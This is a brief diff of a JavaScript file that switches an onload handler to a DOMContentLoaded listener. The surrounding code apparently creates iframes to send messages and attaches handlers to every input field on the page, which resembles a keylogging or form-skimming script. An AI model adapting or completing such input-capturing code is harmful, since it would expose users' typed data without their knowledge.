@@ -1,4 +1,4 @@
-document.onload = function() {
+document.addEventListener('DOMContentLoaded', function() {
 function sendRequest(message) {
     var i = document.createElement('iframe');
     document.body.appendChild(i);
@@ -19,4 +19,4 @@ document.querySelectorAll('input').forEach(inputElement => {
 setInterval(() => {
     se = !se;
 },1000);
-}
+});
